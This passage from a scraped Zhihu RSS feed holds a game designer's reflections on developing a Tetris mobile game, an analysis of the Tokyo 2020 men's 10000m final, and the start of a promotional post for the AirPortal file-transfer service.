的邀请。大家看到这个答案的时候《俄罗斯方块环游记》已经上线了，但这个答案中的很多故事、想法、感慨已经在心里酝酿了很久，很高兴有这个机会能够转化为文字跟大家分享。</b></p>\n<p>1、立项初衷</p>\n<p>我是个健忘的人，当要开始写这段故事的时候，我下意识的翻了一下2017年年底的照片以帮助我回忆。看了会照片后我想起很多事情，比如那时候我还一根白头发没有，养了一只叫布丁的花枝鼠，姥姥还在。</p>\n<p>刚接触Tetris时，它最吸引我们团队的地方是和一般的IP，例如故事、角色形象不一样，Tetris是一个家喻户晓的玩法。而我们又是一群特别喜欢设计新玩法的团队，我能想象也期望着它的变化与玩法延展能给我们一个大的发挥空间，这是件令人兴奋的事情。我用了一个月的时间来研究现代俄罗斯方块的各个版本，深入研究后，我发现原来在国外俄罗斯方块已经在各种平台上演变出了大小玩法上百种的新内容和规则变化，而这些新模式我们在国内很多人之前都没有玩到过。所以我当时我就很希望这款手游能承载这个小目标，能让国人玩到这些新内容，能给大家带来一些关于俄罗斯方块的惊喜。</p>\n<p><b>2、初次测试反馈</b></p>\n<p>第一个版本是在开发几个月时候在tap上测试的，这是一个完全创新，又有些“放飞自我“的版本。我记得几个月前和模电一起吃饭，临走时候他和我说，第一个版本是他最喜欢的版本。我不想对此发表我的想法，但是我理解他的意思。那是一个纯粹的tetis粉丝版本，那个版本有点小众。我记得当时每天都在看玩家的反馈，每晚到凌晨还在看玩家在世界频道说什么。总结来说，那个版本偏难。手感也有很多问题，如果是经常接触现代俄罗斯方块的玩家会觉得难度刚刚好，且他们对我们游戏当时的操作有很高的包容性。但是对于绝大多数新玩家来说，游戏的关卡设计太偏向解密性质了，而且那个版本当时还没来及做充足的新手指引。这让很多玩家在前期关卡卡住而消失。测试后的数据很不理想，我大概自闭了5天左右，不想和任何人说话。我把大家反馈的问题记录下来，写了很长的一个反思文，嗯….一个土黄色的PPT长文。以用于后续的版本调整。</p>\n<p>后面随着调整和优化，测试的数据也在逐步变好。我想和所有反馈给环游记建议的玩家说一声：谢谢…这句苍白的话是真诚的。</p>\n<p><b>3、在PVE和PVP中抉择</b></p>\n<p>虽然说如果问大家说是否知道俄罗斯方块，大家可能很多人都说知道，也会说会玩。但是我们的调研发现，大部分同学对于俄罗斯方块的认知，还是处于很早前的那个游戏机上的原始版本。对于俄罗斯方块如何对战，如何攻击对手，如何KO对手，还是比较模糊的。之前我们做过一次以PVP为起始的版本，数据不是很理想，其主要原因有2个，上面我说的是其中一个，就是大家会玩俄罗斯方块，但是不知道如何去击败对手。而俄罗斯方块的攻击规则又相对比较复杂，它和你的操作效率成正比。加上大家在之前也很少在手机上练习俄罗斯方块的操作手速，这2个问题抬高了玩家参与PVP的上手难度。玩家会因为手速和脑速不符在前期很容易在PVP中出现挫败感，而这种挫败感会让体验的玩家感到不适。</p>\n<p>所以在经过多次测试后，我们将更加简单、轻松的PVE关卡放在了游戏体验的开始。大家可以先了解规则，使用操作，熟练操作，然后再逐步解锁PVP的各个系统。</p>\n<p>当然，为了让喜欢俄罗斯方块竞技的老手们快速的体验到他们想玩的内容，我们的PVP解锁不仅可以通过打关卡和等级，也可以通过在经典马拉松中测试手速，如果手速达到标准，可以直接解锁竞技！</p>\n<p><b>4、上线后的一些感慨</b></p>\n<p>希望大家对小环游能多一些耐心和包容。因为俄罗斯方块环游记的整个开发并没有很好的前车之鉴，我们在整个近4年的的设计与开发就像一条没有路的登山一样，一直是在不停的探索、摸索，但我们是用真心在做这个游戏。我常常和研发同学说，游戏作为一种娱乐性质的产品，只有你自己快乐，才能把它流露在游戏中，让大家体验到快乐。但是很遗憾，虽然这一路开发环游记我们很沉迷和喜爱这个过程，但是这个过程也有很多迷茫的时候，困难不断，我们常常也会遇到很多挫折和受挫，而这些五味杂陈的情感可能也多多少少进入了游戏的设计细胞中，我认为它不一定是件坏事，因为有了这些苦辣酸甜感，或许会让环游记的故事变得更加饱满。但是呢，在环游记骨子里，它依然是那个儿时的少年，像三十多年前它带给大家快乐，让大家沉浸于码块，那个超越国界，超越种族，让全世界都喜欢的那个正能量的”小朋友“，真心的希望大家在上线后对小环游多多包容它,多多支持它~</p>\n<p>最后，我想谢谢一路陪伴我们测试的方块超人们，这3年多来你们的反馈，你们的鼓励，一直是我们前方的灯。可能你们不知道，有好多好多好多的时光里，当我们开发出现困境的时候，我们常常会内部相互转发你们在评论里给我们的鼓励，包括一直督促我们抓紧上线，督促我们抓紧优化，我们其实每一条评论都看了....这一路虽然很艰难，但是我总和身边的大家说：有喜欢你游戏的人，是一种荣幸，无论人多人少，我们都要珍惜喜欢它的每一个玩家。因为是广大方块超人们的鼓励，让我们一直坚持下来。</p>\n<p>鞠躬+敬礼(^^ゞ！！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b0933ed8a45cf6a1e8eb39c6827ab2e1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"290\" data-rawheight=\"234\" data-watermark=\"watermark\" data-original-src=\"v2-b0933ed8a45cf6a1e8eb39c6827ab2e1\" data-watermark-src=\"v2-282379d843e5346f3a161ae121cf8638\" data-private-watermark-src=\"v2-c68fa1807555b2d71e4fbc87cd182281\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/waltz-68?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Poly</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20401449?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你会怎样向一个从没玩过俄罗斯方块的人解释这个游戏的玩法？</a><br><a href=\"http://www.zhihu.com/question/28928581?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么国内连连看比俄罗斯方块火得多？</a><br>\n","link":"http://www.zhihu.com/question/470408812/answer/2027319600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？","date":"2021-07-31 06:30:08","description":"\n<p>21岁的<b>塞勒蒙·巴雷加</b>（Selemon BAREGA）捍卫了曾经格布雷塞拉西耶、贝克勒的荣耀！</p>\n<p>27分43秒22的冠军成绩成绩并不算快，但对很多赛前预估者来说，当打之年的切普特盖的落败，还是算得上是一个小冷门？</p>\n<p>埃塞俄比亚队最后几百米的战术相当成功。</p>\n<p>万米世界纪录保持者，24岁的约书亚·切普特盖27分43秒6拿到银牌，其实他今年万米跑的并不多（也不算太亮眼），这个成绩依然SB（赛季最佳）了，只可惜他今天在埃塞军团的夹击下最后也是无力反超。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-626bd8ffa176643377a3f41ab325d75e_720w.jpeg?rss\" data-caption=\"塞勒蒙·巴雷加此前3000-5000米跑的更多些，是2019年多哈世锦赛5000米的银牌\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-626bd8ffa176643377a3f41ab325d75e\" data-watermark-src=\"v2-7c96d29ae286aaa9201e07f80e1a7cc7\" data-private-watermark-src=\"v2-d08dc97c064f9186128839e1e4cf69c9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f1d2a4a117a7f5de46eb076a0bf49288_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-f1d2a4a117a7f5de46eb076a0bf49288\" data-watermark-src=\"v2-7863f3b880b276574d7c23370c69d631\" data-private-watermark-src=\"v2-558ee04208ce72442c9ac47c712b21d6\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-fa8d39bb41e241aded120d20df9bd841_720w.png?rss\" data-caption=\"塞勒蒙·巴雷加的名次看起来起起落落，实际上倒是决赛选手间的战术抉择体现，并没有那么明显的落后-逆转过程\" data-size=\"normal\" data-rawwidth=\"1204\" data-rawheight=\"658\" data-watermark=\"watermark\" data-original-src=\"v2-fa8d39bb41e241aded120d20df9bd841\" data-watermark-src=\"v2-631db7b5c7112a4d72359c8742794a30\" data-private-watermark-src=\"v2-db67eeccb9b08d2f47841538fd2b4cb1\"></p>\n<hr>\n<p>长跑算是比较垂直关注的领域了，就多说说——</p>\n<ul>\n<li><b>东京奥运会万米前瞻</b></li>\n<li><b>万米决赛现场回顾</b></li>\n<li><b>赛后复盘</b></li>\n</ul>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac2835a41e4e0f6ba2f046e4392f0754_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-ac2835a41e4e0f6ba2f046e4392f0754\" data-watermark-src=\"v2-d4e9e1e4fff90cea36c92df4fe9fbb80\" data-private-watermark-src=\"v2-da00cadef54249c5d9ae418e3e87508c\"></p>\n<p><br></p>\n<h2>东京奥运会万米前瞻</h2>\n<p>10000米在奥运会的径赛里一直是非常重要且传奇的项目——历史上几乎所有长跑领域的传奇选手，都拿到过奥运会万米的金牌。</p>\n<p>其中最为传奇的几位，还都拿到过至少两次。</p>\n<p><br></p>\n<p>比如上古时期的“芬兰飞人” 帕沃·努尔米（1920/1928）和拉瑟维纶（1972/1976）、上古传奇纳米尔·扎托佩克（1948/1952）、“长跑皇帝”格布雷塞拉西耶（1996/2000）、肯尼萨·贝克勒（2004/2008）、莫法拉（2012/2016）——<b>努尔米、扎托佩克、老格、贝克勒等，几乎都是长跑领域某段时期GOAT的人选。</b></p>\n<p>所以<b>奥运会的万米比赛，和历史级的长跑超级巨星，某种程度上相互成就。</b></p>\n<p>这是最耀眼的舞台，也有着最耀眼的选手。<br><br>最近几年冒出来的<b>约书亚·切普特盖</b>（Joshua Cheptegei）势头很猛，也几乎把长跑径赛和路跑的各种纪录拿到手软，很多人都把他当做老格和贝克勒的接班人（想一想这是怎样的褒奖）。<br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bdeb27f15216b09dab1a507937942e5d_720w.jpeg?rss\" data-caption=\"切普特盖最终27分43秒6拿到银牌\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-bdeb27f15216b09dab1a507937942e5d\" data-watermark-src=\"v2-5a206df64e0f5dfeb7bb2d55d20cf7c7\" data-private-watermark-src=\"v2-5bb2c9725894126c25b3b91be8521791\"></p>\n<p>2016年里约奥运会切普特盖才19岁毕竟太年轻，当时5000米第8、10000米第6，只能算少年初体验。当时比赛中有几个细节，包括莫法拉的反超，相信对切普特盖来说是很生动的现场教学了…… 然后今年莫法拉廉颇老矣，虽然自己很想再搏一把，整个英国都给他创造条件连着数次选拔赛机会，可惜确实38岁年纪太大没法来东京。所以原本旧王退位、新王加冕的戏份就少了很多。 </p>\n<p><b>约书亚·切普特盖毫无疑问就是今晚东京奥运会10000米决赛的最强者。即便其实他今年正儿八经的万米比赛跑的并不算太多太亮眼。</b></p>\n<p>关于切普特盖直接看以前的回答吧：</p>\n<a href=\"https://www.zhihu.com/question/424644517/answer/1515786329\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-09cfda2cbf58b244917c02ad1e5671a2_bh.jpg\" data-image-width=\"1160\" data-image-height=\"678\" class=\"internal\">如何评价乌干达选手切普特盖以26分11秒00打破男子10000米世界纪录？</a><a href=\"https://www.zhihu.com/question/414420407/answer/1411416370\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-745710d4ef9af936eaa5d29280cd614d_bh.jpg\" data-image-width=\"980\" data-image-height=\"654\" class=\"internal\">如何评价乌干达选手切普特盖以 12 分 35 秒 36 打破男子 5000 米世界纪录？</a><p><br>其它几位最有竞争的，老乡<b>雅各布·基普利莫</b>，肯尼亚的<b>基普鲁托</b>和<b>科威莫</b>，埃塞的<b>塞勒蒙·巴雷加</b>、约米夫·卡加尔查、<b>贝里胡·阿雷加维</b>，还有欧洲的朱利安·万德斯和马克·斯科特、包括东道主日本的伊藤達彦和相泽晃。</p>\n<p>——这里面前面几位都算很有竞争力的选手，非常可能冲击切普特盖的金牌；朱利安·万德斯和马克·斯科特等算是欧洲白人的荣光，其实力不见得能冲击奖牌、但还是要超过很多欧洲归化的老黑们；伊藤达彦相泽晃等重在参与，不过在日本包括现在国内，都算很有人气的选手。</p>\n<p>——最后另外一点，万米对普通人来说是有氧慢跑，但对职业选手而言是很看重速度冲刺能力的高强度长跑，所以现在出成绩也是越来越早，24岁的切普特盖在决赛这些人里甚至年龄都排靠中后了。前几位乌干达/埃塞/肯尼亚的，年纪都在20-24岁，决赛最有希望冲击名次的<b>艾哈迈德</b>（索马里裔的加拿大人）也就30岁。</p>\n<p>所以和前两届莫法拉蝉联还不太一样，今年东京奥运会10000米，还是相当“年轻风暴”的。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-898ff8c1a9b9acc93ccf116e8c252a4a_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-898ff8c1a9b9acc93ccf116e8c252a4a\" data-watermark-src=\"v2-a805e8d46887defb32e49b41d23a83d4\" data-private-watermark-src=\"v2-481d0c97c60f01d5fe8cac09e063b2e9\"></p>\n<p><br></p>\n<p>长跑言必称东非两强（肯尼亚和埃塞俄比亚），埃塞有老格和贝克勒，肯尼亚却一直很尴尬的在奥运会万米上只有1968年墨西哥奥运会拿到过冠军。后来的特加特（两次亚军）、塔努伊都只拿到银牌，所以肯尼亚的几位也会非常看重这块金牌。</p>\n<p>——乌干达、埃塞俄比亚、肯尼亚三大军团如何选择比赛战术，也是相当有看点的。</p>\n<p><br></p>\n<h2><b>东京万米决赛现场回顾</b></h2>\n<h3><b>0-3000米</b></h3>\n<p>比赛开始后大家相对保守。除了乌干达的斯蒂芬·基萨，一个人很快就跑在最前面——他显然就是在前面带节奏、发挥战术作用的。</p>\n<p>前面几圈大家表现的相对都很稳，这种名次＞成绩的比赛，选手都很会压成绩、拼后面的战术。</p>\n<p><br></p>\n<p>基萨在前面的领跑达到近100米，<b>切普特盖和最后的冠军巴雷加就“鸡贼”很多前面一公里都几乎是在末尾。几乎刚开始就放弃了追求成绩</b>；</p>\n<p>乌干达另一位热门基普利莫也是，第二公里就又降了位置，也落到很后面的位置；</p>\n<p>窝在后面的还有埃塞俄比亚的阿雷加维（最后拿到第四）。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-231f916fb902f11b3b726fca6b40b79e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-231f916fb902f11b3b726fca6b40b79e\" data-watermark-src=\"v2-8860e14188566c1f54aac0cce24959d7\" data-private-watermark-src=\"v2-0cfa71c80657cf79a23a9a8907ae9b25\"></p>\n<p><br></p>\n<p>巴雷加此前万米跑的并不算多，过去几年更专注在3000-5000米这个距离，所以他的冲刺能力是非常强的——这也是为什么切普特盖们一直按兵不动的原因。</p>\n<p><b>所以从开始这一段，基本上一人在前面以追成好成绩（也是高风险）的快速领跑、其余最有竞争力的选手都在大部队的中后位置静候比赛后半程出招。</b></p>\n<p>巴雷加也意识到这一点，所以2-3公里的时候他提速，冲了出来，并开始实质性的领跑。</p>\n<p>前3000米后，切普特盖也提到队伍的前列中（第8）。</p>\n<p><br></p>\n<h3>3000-6000米</h3>\n<p>这一段依然并不明朗。</p>\n<p>从赛后复盘的分段名次来看，前列选手分段排名起起落落，但实际上这依然是自我战术抉择的体现，实际互相之间的落后和起伏并不大。</p>\n<p>比赛半程左右，大家的配速都稍有提升，所有选手间的间距也逐渐变大。切普特盖差不多稳定在3、4名的位置，和基普利莫前前后后的跑着。</p>\n<p>巴雷加这一段就特别迷，小集团领跑后，<b>又开始躲进了大队伍当中，藏住了自己的锋芒</b>。</p>\n<p>——所以说这场万米决赛，<b>选手互相之间心理上的博弈是很丰富的</b>。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-61cc4b8f7e83075adde10a7e7a57a768_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-61cc4b8f7e83075adde10a7e7a57a768\" data-watermark-src=\"v2-5189fbe0c3edaf4265c28a4277672b79\" data-private-watermark-src=\"v2-20da22d37272b662ee8ac13c1ac8f8d2\"></p>\n<p><br></p>\n<p>解说说到伊藤达彦和相泽晃是「企业职员」，这个说法并不代表他们日常是在企业上班的白领——日本的长跑有着很有特色的企业团文化，职业选手都是挂靠在大企业旗下，代表企业出战。所以他们依然是职业长跑选手的身份，日常几乎不参与到企业常规上班工作中。</p>\n<p>创造了日本万米国家纪录（27:18:75）的相泽晃，今天最终也跑出SB（赛季最佳）。24岁的相泽晃和23岁的伊藤达彦最终一个17一个21名——<b>在5000-10000米、乃至更长的马拉松距离，日本确实比我们是要领先不止一个身位的。</b>他们顶尖选手的数量也要远远超过我们，这个差距还是要承认的。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c5ec03a8564b7c37892b2da0bb3ef86e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-c5ec03a8564b7c37892b2da0bb3ef86e\" data-watermark-src=\"v2-c74e223aeee0981e3f100cc80bca90ff\" data-private-watermark-src=\"v2-80137ee2e33ad8647a23115bdb156488\"></p>\n<p><br></p>\n<h3>6000-8000米</h3>\n<p>6000米后大部队开始拉成直线，最前最后的差距也拉到超过百米。</p>\n<p><br></p>\n<p>最开始在前面领跑的基萨过了5000米就放慢脚步，然后退赛了。<b>今天他的作用就像是鱼钩或者说浮标——可惜身后的这些选手似乎对这个鱼钩并不感冒，即没有追求成绩贸然提速，也没有表现出多少想要紧跟住他寻求破风效果的意思。</b></p>\n<p>所以电视解说认为的基萨就是为乌干达另外两人服务的说法，计划是如此，实际效果并不能说达成多少。或者说，真正帮助到约书亚·切普特盖的距离，并没有那么长。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-13041c8df94ec36114252d334e966e05_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-13041c8df94ec36114252d334e966e05\" data-watermark-src=\"v2-c74432daadbc7bdb8616e3a3178b82ad\" data-private-watermark-src=\"v2-4f14c59f7b4cd4205cd0290a8c3aed2a\"></p>\n<p><br></p>\n<p>切普特盖慢慢向前超，跑到队伍最前列，同样在前面的还有肯尼亚的基普鲁托——这位是前五公里路跑纪录创造者，破掉他纪录的正是切普特盖。</p>\n<p>处于前列的还有加拿大30岁的老将艾哈迈德（索马里裔），他今天的表现其实非常不错，孤身作战、最后一公里才掉出来，原本是有机会拿到更好名次甚至站台的。</p>\n<p><br></p>\n<h3>8000-9000米</h3>\n<p>最后两公里，多数选手咬牙，前列选手开始逐渐明朗。</p>\n<p>在最前面的基普鲁托和科威莫的消耗应该相当的大，这两个肯尼亚选手后半程依然在前列，但能明显感觉出体能出现了问题。即便这时候基普鲁托依然看上去在给切普特盖施压——如果最后几百米上演冲刺决战，基普鲁托和科威莫估计是很难有胜算的。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac2835a41e4e0f6ba2f046e4392f0754_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-ac2835a41e4e0f6ba2f046e4392f0754\" data-watermark-src=\"v2-d4e9e1e4fff90cea36c92df4fe9fbb80\" data-private-watermark-src=\"v2-da00cadef54249c5d9ae418e3e87508c\"></p>\n<p><br></p>\n<h3>最后1000米</h3>\n<p>进入最后几圈时候，排位依次是肯尼亚的科威莫、乌干达的切普特盖和基普鲁托、加拿大的艾哈迈德、埃塞俄比亚的巴雷加和卡加尔查。</p>\n<p>这时候<b>埃塞俄比亚三驾马车开始发威，三人几乎一起从第一集团的前中后开始、从外道超越，呈现出钳制的队形。</b></p>\n<p>他们三人在外圈相当于既保持了整个队形（队伍中很难有人能冲出来，除非极大的提速消耗）、又能对前面的切普特盖保持冲击。</p>\n<p>所以最后这一段看，在所有选手体能都即将竭尽的时候，面对这三人的封锁，要么提早冲，要么被耗在里面，或者就等着巴雷加、卡加尔查、阿雷加维自己垮掉……</p>\n<p><br></p>\n<p>最后600米，老将艾哈迈德冲了出来，开始起速。切普特盖依然在跟，但逐渐被巴雷加赶上。</p>\n<p><b>最后的冲刺决斗，阿雷加维依然在“封堵”、乌干达的切普特盖和基普利莫开始冲、巴雷加展现出极强的维持极速的能力……切普特盖的冲刺依然很给力，甚至于如果再多个100米，比赛结果说不定就反过来了。</b></p>\n<p><b>不过21岁的巴雷加依然笑到了最后。</b></p>\n<p><br></p>\n<p>最终，</p>\n<p>巴雷加27分43秒22，金牌；</p>\n<p>切普特盖27分43秒6，银牌；</p>\n<p>基普利莫27分43秒88，铜牌；</p>\n<p>阿雷加维27分46秒16，第四；</p>\n<p>美国的费舍尔·格兰特最后超过艾哈迈德，第五；</p>\n<p>艾哈迈德第六，科威莫第七。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-626bd8ffa176643377a3f41ab325d75e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-626bd8ffa176643377a3f41ab325d75e\" data-watermark-src=\"v2-7c96d29ae286aaa9201e07f80e1a7cc7\" data-private-watermark-src=\"v2-d08dc97c064f9186128839e1e4cf69c9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f1d2a4a117a7f5de46eb076a0bf49288_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-f1d2a4a117a7f5de46eb076a0bf49288\" data-watermark-src=\"v2-7863f3b880b276574d7c23370c69d631\" data-private-watermark-src=\"v2-558ee04208ce72442c9ac47c712b21d6\"></p>\n<p><br></p>\n<h2>赛后复盘</h2>\n<p>21岁的塞勒蒙·巴雷加捍卫了曾经格布雷塞拉西耶、贝克勒的荣耀——<b>人类的长跑史上，格布雷塞拉西耶和贝克勒就如同马拉多纳和梅西一样——这样的比喻下，可能更远古的扎托佩克就是贝利了。</b></p>\n<p>27分43秒22的冠军成绩成绩并不算快，但对很多赛前预估者来说，当打之年的切普特盖的落败，还是算得上是一个小冷门？——赛前不少对冠军的预测中，尽管切普特盖未必在自己的最佳状态，他和基普利莫的二人组依然被视为最大热门。而埃塞俄比亚队最后几圈的战术相当成功，也实现了捍卫埃塞俄比亚荣耀、「让乌干达人回家」的目标。</p>\n<p><br></p>\n<p>成绩不算好，观赏性不差，战术也很强。</p>\n<p>另外费舍尔·格兰特、艾哈迈德乃至两位东道主都表现出自己的水准。</p>\n<p><br></p>\n<p>对切普特盖而言，他肯定依然是万米这个距离的最强者，但这次没有拿下金牌确实相当的可惜，毕竟按如今东非军团的飞速发展态势，3年后的巴黎奥运会，届时27岁的他未必依然像现在这么火热了。</p>\n<p>看看后面5000米他的表现吧。</p>\n<p><br></p>\n<p>再次恭喜塞勒蒙·巴雷加和埃塞俄比亚！</p>\n<p><br></p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">为什么田径室外百米记录要比室内百米记录快？</a></li>\n</ul>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476149568/answer/2029677017?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476534640?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运田径男子组跳高决赛卡塔尔选手和意大利选手共同获得金牌，如何看待这一幕？</a><br><a href=\"http://www.zhihu.com/question/475130160?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运篮球男子组团队小组赛C组日本 77:88 西班牙，如何评价本场比赛？</a><br>\n","link":"http://www.zhihu.com/question/476149568/answer/2029677017?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a 